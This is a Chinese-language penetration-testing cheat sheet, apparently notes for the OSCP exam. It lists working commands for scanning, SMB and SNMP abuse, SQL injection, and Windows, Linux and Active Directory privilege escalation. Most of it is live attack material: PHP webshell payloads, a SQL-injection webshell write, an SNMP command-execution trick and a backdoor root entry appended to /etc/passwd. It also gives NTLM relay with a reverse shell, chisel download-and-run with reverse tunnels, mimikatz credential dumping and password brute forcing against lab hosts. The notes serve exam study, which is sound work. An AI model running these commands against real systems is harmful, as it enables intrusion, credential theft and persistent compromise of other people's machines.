
# Toc
```table-of-contents
style: nestedList # TOC style (nestedList|inlineFirstLevel)
maxLevel: 0 # Include headings up to the speficied level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## 信息收集
### nmap
```bash
### 3389开，看机器上除了 Administrator 还有哪些用户
	rdesktop -u '' -a 16


### 只探活  少量主机不用--min参数
	nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml 121.23.6.0/24

### 只端口 大量目标提速
	nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt
	或
	nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v <IP> -p-

### 考试
nmap -sV -Pn -v  -p 1-65535 --open 192.168.237.143-145 -oA 192
### 参数
--top-ports=20
###筛选脚本
grep 'exploits' /usr/share/nmap/scripts/*.nse
### 脚本详细信息
nmap --script-help=clamav-exec.nse

### tcp
	nmap -sS -sC -Pn -v -p 1-1000 192.168.50.0/24 192.168.45.0/24

### udp
	nmap -sU -v -Pn -p 100-200 192.168.212.151
### 漏洞
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124

nmap -sV --script "exploit" 192.168.242.10
nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.227 

### win扫描端口 powershell扫描端口
	ps> 
	1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.229.151", $_)) "TCP port $_ is open"} 2>$null
### linux扫端口  /usr/share/windows-resources/binaries/nc.exe
	for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

```
## 扫目录
```bash
## 推荐
feroxbuster  -u  http://192.168.237.143/app 

gobuster dir -u 192.168.229.149 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html 

dirsearch -u xxxx

gobuster dir -u http://192.168.231.16:5002/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -p pattern -t 64

/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### smb..共享
```bash
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
## 破解   用户在目标有管理员权限会提示pwn3d
crackmapexec smb 192.168.50.242-243 -u usernames.txt -p passwords.txt --continue-on-success


proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
## 共享
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'xxxxx'
## 下到本机 不好用 建议用smbclient下载
nxc smb  192.168.217.248 -u postmaster -p postmaster  -M spider_plus -o READ_ONLY=false
		--lsa                      ###Dumping LSA secrets
		--gen-relay-list asd.txt   ###不需要SMB签名的主机
		--pass-pol                 ###域密码策略
		--no-bruteforce            ###无需爆破
		-M spider_plus             ###所有可读文件
		--put-file /tmp/users C:\\whoami.txt
		--get-file C:\\Windows\\whoami.txt /tmp/file
		--local-auth               ###本地认证
		--port 
		--exec-method  wmiexec/atexec/smbexec###执行命令的方式
		-x                         ###cmd
		-X                         ###powershell  
		--shares 
		--share 'C$'
	winrm 
		-d DOMAINName              ###不使用smb连接
		-X                         ###执行命令
	mssql 
		-M mssql_priv              ###提权 
		-q 'SELECT name FROM master.dbo.sysdatabases;'
		用msdat

## 枚举信息
	enum4linux -a ip
	
	smbclient
### 列出所有共享
smbclient -p 4455 -L //192.168.250.242/ -U johhr_admin --password 'dqsTwTpZPn'
smbclient -p 4455 -L //192.168.250.242/ -U 'relia\jim' --password 'dqsTwTpZ'  ###域用户认证
crackmapexec smb 192.168.250.242 -u john -p "dqsTwTpZPn#nL" --shares
### 访问指定共享 ls get 用双引号
	smbclient -p 4455  //192.168.215.63/Scripts -U hr_admin --password Welcome1234 
	get "xx"  下载文件
	put ./xxx  /xx/xx/xxx ##先到想要的目录下 

### smbmap 
	smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
	smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

### rpcclient
	rpcclient -U "" -N 172.16.5.5
	> enumdomusers
```
### SMTP
```bash
### swaks
	sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.225.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
	
### 25 smtp discovery
	nmap -v -p 25 --script smb-os-discovery.nse -iL smtpip | grep open 

### 用户是否存在探测
	nc -nv 192.168.248.189 25


### 自动探测用户是否存在python3 smtp.py root 192.168.50.8

#!/usr/bin/python

import socket
import sys
if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))
# Receive the banner
banner = s.recv(1024)
print(banner)
# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)
# Close the socket
s.close()
```
### SNMP
```bash
## SNMP服务
	sudo nmap -sU --open -p 161 192.168.229.149 -oG open-snmp.txt


## 列出当前tcp监听端口
	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.6.13.1.3

## 当前进程
	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.25.4.2.1.2

## 用户
	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.4.1.77.1.2.25

# #安装的软件
	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.25.6.3.1.2
## 已经执行的命令
	snmpwalk -v2c -c public 192.168.229.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

snmpwalk -c public -v1 192.168.229.149  1.3.6.1.2.1.6.13.1.3
|1.3.6.1.2.1.25.1.6.0|System Processes|
|1.3.6.1.2.1.25.4.2.1.2|Running Programs|
|1.3.6.1.2.1.25.4.2.1.4|Processes Path|
|1.3.6.1.2.1.25.2.3.1.4|Storage Units|
|1.3.6.1.2.1.25.6.3.1.2|Software Name|
|1.3.6.1.4.1.77.1.2.25|User Accounts|
|1.3.6.1.2.1.6.13.1.3|TCP Local Ports|


## 执行命令
	https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-snmp/snmp-rce

	kali> snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 192.168.229.149  'nsExtendStatus."evilcommand"' = createAndGo  'nsExtendCommand."evilcommand"' = /bin/sh  'nsExtendArgs."evilcommand"' = 'whoami'
	kali> snmpwalk -v2c -c public 192.168.229.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

```


## 漏洞扫描
### nessus
```

```
### nmap
```bash
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124

nmap -sV --script "exploit" 192.168.242.10
nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.227
```

## 常见漏洞
```bash
xss
	提权管理员
目录遍历
	读用户
	读id_rsa 私钥
		/home/offsec/.ssh/id_rsa
		ssh -i ss_risa -p 2222 offsec@mountaindesserts.com
文件包含
	apache日志 useragent   <?php echo system($_GET['cmd']);?>  
	访问时记得使用& 而不是？
	%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/
	%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\
	../../../../../../../../../../../../../../../../../../
	..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
	
	##直接读取文件
	php://filter/convert.base64-encode/resource=xxx
	##将数据嵌入到web中执行   必须allow_url_include
	data://
	data://text/plain,<?php%20echo%20system('dir')?> 
	data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
	
文件上传
	传马
		<?php system($_REQUEST['cmd']); ?>
		<?php echo system($_GET['cmd']); ?>
	传公钥覆盖
		ssh-keygen
		cat fileup.pub 
		../../../../../../../../../root/.ssh/authorized_keys
		rm ~/.ssh/known_hosts
		ssh -p 2222 -i fileup root@mountaindesserts.com

	php7
	phps 
	phtml
	大小写
	
命令注入
	##截断 
	;  %3b
	& &&
	###判断当前环境
	(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

### SQL注入 
mysql
```sql
### mysql
练接
mysql -u root -p'root' -h 192.168.199.197   -P 3306

### 联合查询
	1' union select 1,2,3-- -
	查数据库
  database()
  1' union select schema_name,1 from information_schema.schemata
  查表
  1' union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #
  查列
  1' union select group_concat(column_name),database() from information_schema.columns where table_schema = database() #
  
### 报错注入
	floor
		-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)--+
	extractvalue
		-1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
	updatexml
		-1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
		
###布尔盲注
	1' and length(database()>=8)-- 
	1' and left(database(),1)='a'-- 
	1' and substr(database(),2,1)='a'-- 
	
### 时间注入
	1’ and if(length(database())=4,sleep(5),1)


### shell
写文件
	'+UNION+SELECT+null,"<%3fphp+system($_GET['cmd'])%3b%3f>",+null,+null+INTO+OUTFILE+"/var/www/html/tmp/a.php"+--+//
	
```
mssql sql server
```bash
### mssql
连接
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient -windows-auth oscp.exam/sql_svc:Dolphin1@10.10.99.148
## 所有库
SELECT name FROM sys.databases;
## offsec库里的所有表
SELECT * FROM offsec.information_schema.tables;
## offsec库的users表内容
select * from offsec.dbo.users;
## 开xp_cmdshell
enable_xp_cmdshell 
xp_cmdshell whoami


## shell  xp-cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';

## 补充
#';WAITFOR DELAY '0:0:5'--

```

## 溢出
```
## 程序
以后做

### web组件
searchsploit搜索
```

## av bypass
```
remote
powershell
	chimera
tide免杀平台

```
## 密码相关

```bash
hydra. 
### ssh
	hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.218.201 
	nxc ssh  ./192 -u ./user -p ./pass --port 2222  --continue-on-success
	sshspray -u ./user -p ./pass  -h   192.168.245.132 
### rdp 
	hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
	python RDPassSpray.py -t 172.16.202.12   -u  yoshi   -p Mushroom!   -d medtech.com ##记得带domain
	rdpspray -U ./user -P pass -T ./192 

### get 401
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-get /
### post
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

### 附
hydra -l root -p 123456 -M mysql_domain   -v  mysql -t 16 -w 5

hash
### 识别
	hashid
	hash-identify
## hashcat
	### 调试
	hashcat -r upper.rule --stdout testword.txt
	### md5破解
	hashcat -m 0 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force

## 密码管理器
	### 找文件 keepass
	Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	### 格式化
	keepass2john Database.kdbx > keepass.hash
	### 看下hash有没有问题  hash删Database:
	### 找m
	hashcat -h | grep -i 'KeePasshtlm'
	### 破解 hashcat删除开头的Database:
	hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force


## ssh 私钥 破解ssh  id_ecdsa id_eddsa id_dsa id_rsa
	chmod 600 id_rsa
	### 格式化hash
	ssh2john id_rsa > ssh.hash
	### 规则   按需要添加
	/etc/john/john.conf
	第一行加上  [List.Rules:sshRules]
	### crack
	john --wordlist=ssh.passwords --rules=sshRules ssh.hash
	john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
	私钥登录

## NTLM hash 
### ntlm破解 mimikatz直接解明文 已经有了管理员shell
	privilege::debug	###开启SeDebugPrivilege访问权限
	token::elevate 		###提升至system权限
	lsadump::sam
	hashcat -m 1000 2835573fb334e3696ef62a00e5cf7571 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
### ntlm传递 已经有了shell，执行命令需要此账户在目标机有管理员权限，无视UAC
smb 
	mimikatz
	impacket-psexec -hashes 00000000000000000000000000000000:管理员hash Administrator@120.63.142.48 cmd.exe


### netntlmv2 NetNTLMv2密码破解 跳板机可以执行命令，账户在目标机没有管理员权限
	hash不用删
	responder -I tun0  或Inveigh
	目标：dir \\kaliip\\test123
	hashcat -m 5600 ./pual.hash /usr/share/wordlists/rockyou.txt --force 
	
	>win  Inveigh
	>powershell-session
Import-Module .\Inveigh.ps1
	>powershell-session
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

### netntlmv2中继  跳板机可以执行命令，目标机正在以本地管理员登录并且密码和js一样 需要目标禁用UAC
	crackmapexec扫描结果显示false代表可能可以用中继攻击
	impacket-ntlmrelayx --no-http-server -smb2support -t 目标机 -c "powershell -nop -w hidden -e reverseShell"
	跳板机：dir \\kaliip\test123
	kali: nc  1234


```
hashcat
```bash
### 调试
hashcat -r upper.rule --stdout testword.txt

### md5破解
hashcat -m 0 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force
```

## win提权
### win信息收集
```bash
## 自动
	/usr/share/privilege/win/winPEASany.exe
## 手动
	主机名
	ip
	域
	当前用户
	当前用户组
	
	密码管理器
	


```

自动化工具
```bash
### winPEASx64.exe
	/usr/share/privilege/win/winPEASany.exe
	ps> iwr -uri http://192.168.45.2280.10.10.9:1111/winPEASany.exe -Outfile winpeas.exe
### Seatbelt
	/usr/share/privilege/win/Seatbelt.exe
	./Seatbelt.exe -group=all
### JAWS

```


powershell..帐号 程序 进程 敏感文件 相关
```powershell

##信息收集
	-用户
	net user 
	net user /domain
	-组
	net localgroup 
	net group /domain
	%%net localgroup /domain%%
	-组用户
	net localgroup administrators
	net group "Domain Admins" /domain
	添加
	net user xxx xxx /add
	net localgroup 'Remote Desktop Users' offsec /add
	改密
	net user administrator xxx

	### 本地操作 域用户需要powerview
		Get-NetRoute
	    Get-LocalUser   
	    Get-localGroup
	    Get-localgroupmember Administrators
	    net user xxx 某人所属组
			帐号无法rdp就用ps> runas
			### 如果可以访问GUI，有帐号密码，可以用runas以另外用户身份执行命令
			runas /user:admin cmd
	### 历史命令
		(Get-PSReadlineOption).HistorySavePath
	Get-History
	### 服务
		Get-Service Cmdlet或Get-CimInstance Cmdlet
	### 网络
		cmd> netstat -anp TCP | find "2222"
	### 个人权限
		whoami /priv
		whoami /user
		whoami /groups

	### 4104 powershell执行记录 
		eventvwr.msc > application and service > Microsoft > Windows > powershell

winpe..
###已安装的32b程序不全，检查2个目录：download、C://32位和64位Program Files
    get-itemproperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
###已安装的64b程序
    get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
### 其他位置程序
	get-itemproperty "HKLM:\SOFTWARE\Microsoft\*" | select displayname
	download 
	C://32位和64位Program Files
###正在运行的进程
	get-process 
	查看某个运行程序（或进程）的命令行参数
	cmd> wmic process get caption,commandline /value
	某一个进程的命令行参数，使用下列方式：
	cmd> wmic process where caption="xxx.exe" get caption,commandline /value
	

###搜索系统上的所有密码管理器数据库
	搜 *windows.old* backup各种不常见文件
    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
###搜索指定后缀名的文件 敏感信息
	Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue
    Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
    Get-ChildItem -Path C:\ -Include credentials.txt -File -Recurse -ErrorAction SilentlyContinue
    Get-ChildItem -Path C:\Users\adrian\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
    Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
### 常用位置 ### 公共位置 ###
    C:\softName
    C:\Users\userName
    C:\Users\public
    *.txt
    *.ini

###查看正在运行的服务的信息
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
###查看正在运行的服务的启动类型
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Apache2.4everything'}

### 下载
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

WinRM
```bash
## 加入Windows Management Users组的话，可以使用winrm进行powershell远程管理
注意转意
evil-winrm  -i 10.10.10.4 -u user -p "qwe111\,\.\/"
	### 下载文件 
		download 1.txt /root/Document/oscpA/ad/SYSTEM

```

### win服务
```powershell 
# powerup使用
	Invoke-AllChecks
	Get-ModifiableService
	Get-ModifiableFile
	Get-ServiceUnquoted
---------
## exe劫持
	### 自动
		/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
		powershell -ep bypass 
		. .\PowerUp.ps1
		Get-ModifiableServiceFile
		### 内置函数-替换服务：重启服务并添加账户john/Password123! 
		Install-ServiceBinary -Name 'mysql'
		### 列安装的程序
			ls 'C:\Program Files'
			###已安装的32b程序不全，检查2个目录：download、C://32位和64位Program Files
		    get-itemproperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
		###已安装的64b程序
		    get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
		### 其他位置程序
			get-itemproperty "HKLM:\SOFTWARE\Microsoft\*" | select displayname
			download 
			C://32位和64位Program Files
			ls C:\Program Files
		    看权限
			icacls "C:\xampp\apache\bin\httpd.exe"
		 
		
	### 手动
		###查看正在运行的服务的信息
		Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
		###查看正在运行的服务的启动类型
		Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'everything'}
		
		### 列举服务 
		services.msc，Get-Service Cmdlet或Get-CimInstance Cmdlet
		### 列运行中的服务
		Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
		### 看w权限
		icacls "C:\xampp\apache\bin\httpd.exe"
		### c添加用户  /usr/share/privilege/win/adduser.c
		x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
		### 覆盖原文件 文件正在使用中》powershell下用move
		### 服务重启 启动
		net stop mysql
		Restart-Service BetaService
		### 服务的启动模式
		Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
		### 自动启动并且有重启权限的话可以重启机器
		whoami /priv
		shutdown /r /t 0
		### 重启服务
			Restart-Service  a.exe
			sc.exe qc a.exe
				qc     #服务信息 谁调用
				query  #服务状态
				start  #启动  权限大
		
----------
## dll劫持
### 正常加载顺序。当禁用安全dll时当前目录会在第二步被搜索，dll缺失是个不错的位置
	1. 程序目录
	2. 系统目录
	3. 16位系统目录
	4. windows目录
	5. 当前目录
	6. $PATH目录

	## 自动 
		/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
	
	## 手动
	    ! sc.exe #管理服务
		### 列运行中的服务
			Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
		### 看w权限
			icacls "C:\xampp\apache\bin\httpd.exe"
		### 找不到替换的exe 找notfound的dll替换。procmod做筛选process name，筛选的是service的exe，
			tool：/usr/share/privilege/win/Procmondll/ 64
		### 恶意dll
			/usr/share/privilege/win/
			x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
		### 重启服务
			Restart-Service  a.exe
			sc.exe qc a.exe
				qc     #服务信息 谁调用
				query  #服务状态
				start  #启动  权限大
				
	
----------
## 未引用路径 空格缺陷。主目录或子目录具有写权限，但无法替换其中的文件时
	### 自动
		PowerUp.ps1
		powershell -ep bypass
		Get-UnquotedService
		### exe是恶意exe
		Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" 
		
	### 手动
		Get-CimInstance -ClassName win32_service | Select Name,State,PathName
		cmd> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
		检查下能不能启动停止服务
		ps> icacls看下路径的w权限

```

### win计划任务 
```powershell
## 计划任务 寻找有权限的 然后文件替换
	## 计划任务列表
	schtasks /query /fo LIST /v
	## 看文件权限
	icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
	## 替换
```

### 其他  
```powershell
--------
## 应用程序漏洞

--------
## 内核洞 

--------
## Windows特权 一般很少，iis中多
	可能特权：SeBackupPrivilege、SeAssignPrimaryToken、SeLoadDriver和SeDebug和SeImpersonatePrivilege

	看是否有以上权限 whoami /priv
	### tools
		PrintSpoofer
			/usr/share/privilege/win/PrintSpoofer64.exe
			.\PrintSpoofer64.exe -i -c powershell.exe 
			
		potato家族：         
		https://jlajara.gitlab.io/Potatoes_Windows_Privesc
			Rogue Potato ###好用
				/usr/share/privilege/win/RoguePotato.exe
				socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
				.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999


			RottenPotato
			SweetPotato
			JuicyPotato
```

## linux提权
### linux信息收集
```bash
------
## 自动
	### unix-privesc-check
		kali> /usr/bin/unix-privesc-check |/usr/share/privilege/linux/unix-privesc-check
		use: ./unix-privesc-check standard > output.txt
	LinEnum
	LinPeas  /usr/share/privilege/linux/
------
## 手动
	## 用户
		id 
			uid1000是第一个
		cat /etc/passwd
			### 利用：条件passwd文件能写
			密码大概率用crypt加密，也可能des或md5
				openssl passwd root
				echo "root2:jHAWKFhGozqCg:0:0:root:/root:/bin/bash" >> /etc/passwd
				
	
	hostname 
	## 版本信息
		uname -a 
	    cat /etc/issue
	    cat /etc/os-release
	    arch
    ## 进程
	    ps aux 
		    -C 进程名
		watch -n 1 "ps -aux | grep pass"
	## 流量 管理员权限
		sudo tcpdump -i lo -A | grep "pass"
	## 路由 
	    ip a
	    routel
	## 网络
	    ss -anp
	    netstat -anp
	## 防火墙
	    cat /etc/iptables/....
	## 计划任务
		ls -lah /etc/cron*
	    sudo crontab -l 
	    cat /var/log/cron.log
	    grep "CRON" /var/log/syslog
	    找能w的文件，反弹shell
	## 敏感文件
		env 
	    .bashrc
	## 写带s权限的文件夹
		find /var -type d -perm /2  2>/dev/null
		find /var -type d -perm -u=w  2>/dev/null
	## 带s权限的文件 suid
		find /    -type f -perm -u=s suid
		find / -perm -u=s -type f 2>/dev/null
		###这种权限的文件会以文件创建者的权限执行，有继承的文件的话其为esid euid
		利用方式: 往下翻，见不安全的组件
	## 有写权限的目录
		find / -writable -type d 2>/dev/null
    ## 安装的程序
		dpkg -l
	## 挂载的目录
		mount
		cat /etc/fstab
		lsblk ##所有可用磁盘
	## 加载的内核
		lsmod
		/sbin/modinfo 内核名  ##内核信息
	
	
	
```
### 泄漏的机密信息
```bash
## 敏感文件
	env 
	.bashrc
###当前用户允许执行的命令
    sudo -l 
###管理员账户可以使用-i切换至root
    sudo -i
### 我们将最小和最大长度设置为6个字符，使用-t参数指定模式，然后将前三个字符硬编码为Lab，后跟三个数字
	crunch  6 7 -t Lab%%% > asd.txt
	hydra

## 进程
	watch -n 1 "ps -aux | grep pass"
## 流量
	sudo tcpdump -i lo -A | grep "pass"
```
### linux不安全的组件
```bash
---------
## 特殊权限滥用
### suid
	### 寻找
		find / -perm -u=s -type f 2>/dev/null
	### 利用，如果find带s权限，正确执行命令后带-exec....
		find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

### Capabilities 保留的管理员特权 好用
	### 寻找
		/usr/sbin/getcap -r / 2>/dev/null
	### 利用
		https://gtfobins.github.io/

---------
## sudo滥用
### 找允许执行的命令  
	sudo -l
### 利用方式，gtf上找对应命令的提权 AppArmor内核模块执行MAC策略以进一步保护系统 
	https://gtfobins.github.io/


--------
## 内核洞
	searchsploit搜索  
	ps:
		cat /etc/issue 系统类型
		uname -r       内核版本
		arch           系统架构
		### 过滤 -v反选
		searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
		### 在目标机器编译
		
```
## 端口重定向和SSH隧道
### win端口重定向
```bash
-------
## ssh 
	%systemdrive%\Windows\System32\OpenSSH 
	远程动态转发

-------
## plink  /usr/share/windows-resources/binaries/plink.exe
	### 想要访问JS的3389 直接用第二个
	JS: C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 
	### 需要输入y的情况  直接用这个 
	cmd.exe /c echo y | .\plink.exe -ssh -l root -pw pass -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7

-------
## netsh  条件：有管理员权限 不是管理员的话要考虑UAC
	### JS上添加转发规则
	netsh interface portproxy add v4tov4 listenport=2222 listenaddress=JSIP connectport=22 connectaddress=targetIP
	### 防火墙添加放行入站端口规则
	netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=JSIP localport=2222 action=allow
	### 防火墙删除规则
	netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
	### 删除转发规则
	netsh interface portproxy del v4tov4 listenport=2222 listenaddress=JSIP
	### 查看监听的port
	netstat -anp TCP | find "2222"
	### 查看存在的porxy
	netsh interface portproxy show all
	
```

### linux 端口重定向和SSH隧道z
```bash
在本地和动态端口转发中，监听端口绑定到SSH客户端；
而在远程端口转发中，监听端口绑定到SSH服务器。
远程端口转发不同于SSH服务器进行数据包转发，而是由SSH客户端进行数据包转发。
--------
## 端口转发
	### socat linux不自带/usr/share/tunnel/linux/
		socat -ddd TCP-LISTEN:22,fork TCP:10.1.1.4:22
	### rinetd 长期端口转发
	### Netcat and a FIFO
	### iptables
--------
## ssh隧道python3 -c 'pty.spawn("/bin/bash")'
	### 本地 缺点一次只能转发一个端口
		python3 -c 'import pty;pty.spawn("/bin/bash")'
		JS: ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
	### 动态 将流量转发到ssh服务器可以访问的任何地方
		python3 -c 'import pty;pty.spawn("/bin/bash")'
		JS: ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
		proxychains JSip port
		
	### 远程 远程是由SSH客户端进行数据包转发。入站流量受限制时使用
		python3 -c 'import pty; pty.spawn("/bin/bash")'
		JS: ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4     ###2345会在kali上监听
	### 动态远程  OpenSSH客户端大于7.6
		python3 -c 'import pty;pty.spawn("/bin/bash")'
		JS: ssh -N -R 9998 kali@192.168.118.4
		proxychains 127.0.0.1 9998
	### sshuttle 
		条件SSH客户端（JS）具有root权限，并且SSH服务器上需要安装Python3，适合内网复杂情况。会自动在kali添加路由，可以直接访问子网
		socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
		sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## 深度包检测 DPI
```bash
## ligolo
ip tuntap add user root  mode tun ligolo
ip link set ligolo up
kali> ligolo -selfcert 
agent> .\ligolo-agent-win.exe -ignore-cert -connect 192.168.45.216:11601
### start! 
session> start
### 添加想要的路由
kali> ip route add 10.10.99.0/24 dev ligolo	

配置内网反连至kali
	ligolo>
		listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
		listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
		listener_add --addr 0.0.0.0:1111 --to 127.0.0.1:1111
		listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306
	vic> curl js_ip:1234
### 删网卡
ifconfig ligolo down && sudo ip link delete ligolo
ss -antlp | grep 11601 
kill -9 



-------
## http  只允许http流量的情况
	### chisel /usr/share/tunnel/win
		kali: chisel server --port 1080 --reverse
		JS: wget 192.168.45.190:1111/chisel -O /tmp/chisel && chmod +x /tmp/chisel
		JS:/tmp/chisel client 192.168.45.216:1080 R:socks > /dev/null 2>&1 &   ###默认在1080监听 proxychains 127.0.0.1 1080
		使用：
			### proxychains 
				socks5 127.0.0.1 1080
			### ssh原生socks 
				ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215

-------
## dns
	### dnscat2  /usr/share/tunnel/dns/
		权威域名服务器：dnscat2-server feline.corp
		JS:./dnscat feline.corp
		权威: 
			windows 
			windows -i 序号
			?
			listen --help
			listen 127.0.0.1:4455 172.16.2.11:445 ### 类似ssh本地转发
		
```

## MSF ../../../msf.md
[[msf]] 
## AD 
[[AD theoretical]] 
### 枚举
```powershell
------
## 手动
	### 系统管理员经常通过组策略首选项（GPP）更改本地工作站密码
		kali>gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"


	ps> 
		net accounts   账户策略
		net user /domain
		net group /domain
		net group 'xxx' /domain
		net group "Management Department" stephanie /add /domain
		net group "Management Department" stephanie /del /domain
	### 获取特定的LDAP ADsPath来与AD服务进行通信
		LDAP://HostName[:PortNumber][/DistinguishedName]
	### 函数脚本+使用 查询组 成员属性
		LDAPSearch [[AD theoretical]] 
	### spn枚举用户和特定服务
			Get-NetUser -SPN | select samaccountname,serviceprincipalname
			或：setspn -L iis_service
			nslookup.exe web04.corp.com 



	## powerview
		PowerView.ps1
